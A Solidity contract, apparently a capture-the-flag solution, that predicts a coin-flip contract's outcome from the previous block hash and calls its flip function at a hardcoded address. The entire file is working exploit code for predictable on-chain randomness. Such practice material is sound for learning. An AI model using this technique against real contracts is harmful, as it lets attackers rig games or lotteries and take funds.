// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GuessFlip {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address target = 0x357de21BDacE4aA6C2C4E058a453F46c7F8D9B6B;

  event GuessResult(bool result);
  event HashCmp(uint256 hash1, uint256 hash2);
  
  function guess() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    
    if (lastHash == blockValue) {
      emit HashCmp(lastHash, blockValue);
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
    (bool success, bytes memory result) = target.call(payload);

    assert(success);
    bool result_b = uint8(result[result.length - 1]) > 0;
    emit GuessResult(result_b);

    return true;
  }
}
